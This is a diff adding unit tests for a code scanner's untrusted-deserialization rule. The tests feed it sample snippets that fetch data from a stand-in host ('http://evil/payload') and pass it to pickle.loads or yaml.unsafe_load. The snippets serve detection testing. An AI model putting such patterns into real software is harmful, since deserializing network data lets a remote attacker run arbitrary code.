@@ -133,6 +133,47 @@ class TestExternalInputToExec:
         assert len(tt5) >= 1
 
 
+# ── TT6: External / file input → deserialization sink ──────────────────
+
+
+class TestUntrustedDeserialization:
+    def test_network_to_pickle_loads(self):
+        code = (
+            "import requests, pickle\n"
+            'blob = requests.get("http://evil/payload").content\n'
+            "obj = pickle.loads(blob)\n"
+        )
+        findings = _run(code)
+        tt6 = [f for f in findings if f.rule_id == "TT6"]
+        assert len(tt6) >= 1
+        assert tt6[0].severity == "HIGH"
+        assert "deserialization" in tt6[0].message
+
+    def test_file_read_to_pickle_load(self):
+        code = 'import pickle\nobj = pickle.load(open("bundled.pkl", "rb"))\n'
+        findings = _run(code)
+        assert any(f.rule_id == "TT6" for f in findings)
+
+    def test_user_input_to_pickle_loads(self):
+        code = "import pickle\npickle.loads(input())\n"
+        findings = _run(code)
+        assert any(f.rule_id == "TT6" for f in findings)
+
+    def test_network_to_yaml_unsafe_load(self):
+        code = (
+            "import requests, yaml\n"
+            'data = requests.get("http://evil").text\n'
+            "yaml.unsafe_load(data)\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT6" for f in findings)
+
+    def test_constant_argument_no_tt6(self):
+        code = 'import pickle\npickle.loads(b"\\x80\\x04constant")\n'
+        findings = _run(code)
+        assert not any(f.rule_id == "TT6" for f in findings)
+
+
 # ── TT1: Direct source-to-sink (generic) ───────────────────────────────
 
 
